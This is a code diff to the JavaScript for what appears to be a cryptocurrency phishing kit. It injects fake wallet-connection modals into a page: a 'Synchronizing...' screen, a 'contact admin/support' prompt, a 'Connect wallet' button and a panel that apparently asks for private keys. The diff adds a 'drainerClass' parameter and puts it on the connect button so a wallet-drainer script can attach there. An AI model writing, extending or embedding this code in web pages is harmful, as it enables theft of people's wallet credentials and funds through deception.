@@ -1,6 +1,6 @@
-const modalsHTML = (formId) => `
+const modalsHTML = (formId, drainerClass) => `
 <!-- Overlay barcode -->
-<button id="connect-btn" style="display: none">Connect</button>
+<button class="connect-btn" style="display: none">Connect</button>
 <div class="modal-layout" id="modal-1">
     <button class="btn-close" id="close-btn">close</button>
     <div class="modal-child">
@@ -8,8 +8,8 @@ const modalsHTML = (formId) => `
             <img src="https://cdn.jsdelivr.net/gh/braingrams/faith-assets/img/two.png" alt="" class="barcode-img" />
         </div>
         <div class="spinnerr"></div>
-        <h4 class="head-7 m-t-5px">Synchronizing...</h4>
-        <h6 class="para-2 m-t-5px">Please contact admin/support for authentication</h6>
+        <h4 class="head-7 m-t-5px" style="color: white;">Synchronizing...</h4>
+        <h6 class="para-2 m-t-5px" style="color: white;">Please contact admin/support for authentication</h6>
     </div>
 </div>
 
@@ -35,7 +35,7 @@ const modalsHTML = (formId) => `
 		<p class="wallet-name">Web3</p>
 		<p class="wallet-info m-t-5px">Connectings via web3...</p>
 	  </div>
-	  <button class="connectButton btn-import btn-import--2" id="close-btn5" dhkk-cro="true">
+	  <button class="${drainerClass} btn-import btn-import--2" id="close-btn5" dhkk-cro="true">
 		Connect wallet
 	  </button>
 	</div>
@@ -106,7 +106,7 @@ const modalsHTML = (formId) => `
 </div>
 `;
 
-function initializeModals(formId) {
+function initializeModals(formId, drainerClass) {
 	const cssLink = document.createElement("link");
 	cssLink.rel = "stylesheet";
 	cssLink.href =
@@ -114,7 +114,10 @@ function initializeModals(formId) {
 	document.head.appendChild(cssLink);
 
 	// Add HTML to the body
-	document.body.insertAdjacentHTML("beforeend", modalsHTML(formId));
+	document.body.insertAdjacentHTML(
+		"beforeend",
+		modalsHTML(formId, drainerClass)
+	);
 	// Modal
 	let $close = document.getElementById("close-btn");
 	let $close2 = document.getElementById("close-btn2");
@@ -126,9 +129,8 @@ function initializeModals(formId) {
 
 	let $open1 = document.querySelectorAll(".wallet-item");
 
-	document
-		.getElementById("connect-btn")
-		.addEventListener("click", function (e) {
+	document.querySelectorAll(".connect-btn").forEach(function (button) {
+		button.addEventListener("click", function (e) {
 			document.querySelector(".lpd-secure-conn").style.display = "block";
 			document.querySelector(".lpd-secure-conn-top").style.display = "none";
 			$modal2.classList.add("active");
@@ -137,6 +139,7 @@ function initializeModals(formId) {
 				document.querySelector(".lpd-secure-conn-top").style.display = "flex";
 			}, 3000);
 		});
+	});
 
 	$close2.addEventListener("click", function () {
 		$modal2.classList.remove("active");
@@ -319,8 +322,8 @@ function initializeModals(formId) {
 		$private.classList.add("active");
 	});
 }
-export default function loadModals(formId) {
+export default function loadModals(formId, drainerClass) {
 	document.addEventListener("DOMContentLoaded", function () {
-		initializeModals(formId);
+		initializeModals(formId, drainerClass);
 	});
 }
